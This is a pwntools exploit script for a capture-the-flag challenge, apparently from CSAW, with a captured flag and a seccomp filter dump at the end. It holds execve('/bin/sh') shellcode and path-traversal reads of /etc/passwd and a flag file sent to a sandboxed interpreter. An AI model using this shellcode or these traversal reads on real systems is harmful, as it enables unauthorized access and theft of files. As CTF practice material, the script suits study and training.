#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './program_name'
#binary = ELF(program_name)

remote_server = 'pwn.chal.csaw.io'
PORT = 1006

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    # p.sendline(p32(0xdeadbeef) + 'print(open("/etc/python/../../etc/passwd).read())')
    p.sendline("g = open('/etc/../home/ctf/flag')")
    p.sendline("data = g.read()")
    p.sendline("print data")

    # ============ GDB =========== #
    #gdb.attach(p)

    p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
'''
flag{part_6_needs_to_happen_for_part_7}

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x27 0xc000003e  if (A != ARCH_X86_64) goto 0041
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x25 0x00 0x40000000  if (A >= 0x40000000) goto 0041
 0004: 0x15 0x25 0x00 0x00000000  if (A == read) goto 0042
 0005: 0x15 0x24 0x00 0x00000001  if (A == write) goto 0042
 0006: 0x15 0x23 0x00 0x00000003  if (A == close) goto 0042
 0007: 0x15 0x22 0x00 0x00000004  if (A == stat) goto 0042
 0008: 0x15 0x21 0x00 0x00000005  if (A == fstat) goto 0042
 0009: 0x15 0x20 0x00 0x00000006  if (A == lstat) goto 0042
 0010: 0x15 0x1f 0x00 0x00000089  if (A == statfs) goto 0042
 0011: 0x15 0x1e 0x00 0x00000009  if (A == mmap) goto 0042
 0012: 0x15 0x1d 0x00 0x0000000a  if (A == mprotect) goto 0042
 0013: 0x15 0x1c 0x00 0x00000015  if (A == access) goto 0042
 0014: 0x15 0x1b 0x00 0x0000000c  if (A == brk) goto 0042
 0015: 0x15 0x1a 0x00 0x00000059  if (A == readlink) goto 0042
 0016: 0x15 0x19 0x00 0x00000048  if (A == fcntl) goto 0042
 0017: 0x15 0x18 0x00 0x0000004d  if (A == ftruncate) goto 0042
 0018: 0x15 0x17 0x00 0x0000002e  if (A == sendmsg) goto 0042
 0019: 0x15 0x16 0x00 0x0000002f  if (A == recvmsg) goto 0042
 0020: 0x15 0x15 0x00 0x0000000b  if (A == munmap) goto 0042
 0021: 0x15 0x14 0x00 0x00000008  if (A == lseek) goto 0042
 0022: 0x15 0x13 0x00 0x000000e7  if (A == exit_group) goto 0042
 0023: 0x15 0x12 0x00 0x0000003c  if (A == exit) goto 0042
 0024: 0x15 0x11 0x00 0x00000027  if (A == getpid) goto 0042
 0025: 0x15 0x10 0x00 0x00000010  if (A == ioctl) goto 0042
 0026: 0x15 0x0f 0x00 0x00000017  if (A == select) goto 0042
 0027: 0x15 0x0e 0x00 0x0000010e  if (A == pselect6) goto 0042
 0028: 0x15 0x0d 0x00 0x0000000d  if (A == rt_sigaction) goto 0042
 0029: 0x15 0x0c 0x00 0x0000000e  if (A == rt_sigprocmask) goto 0042
 0030: 0x15 0x0b 0x00 0x0000004e  if (A == getdents) goto 0042
 0031: 0x15 0x0a 0x00 0x0000012e  if (A == prlimit64) goto 0042
 0032: 0x15 0x09 0x00 0x00000063  if (A == sysinfo) goto 0042
 0033: 0x15 0x08 0x00 0x0000006b  if (A == geteuid) goto 0042
 0034: 0x15 0x07 0x00 0x00000066  if (A == getuid) goto 0042
 0035: 0x15 0x06 0x00 0x0000006c  if (A == getegid) goto 0042
 0036: 0x15 0x05 0x00 0x00000068  if (A == getgid) goto 0042
 0037: 0x15 0x04 0x00 0x000000ca  if (A == futex) goto 0042
 0038: 0x15 0x03 0x00 0x0000001a  if (A == msync) goto 0042
 0039: 0x15 0x02 0x00 0x00000020  if (A == dup) goto 0042
 0040: 0x15 0x01 0x00 0x0000013f  if (A == memfd_create) goto 0042
 0041: 0x06 0x00 0x00 0x00000000  return KILL
 0042: 0x06 0x00 0x00 0x7fff0000  return ALLOW
'''
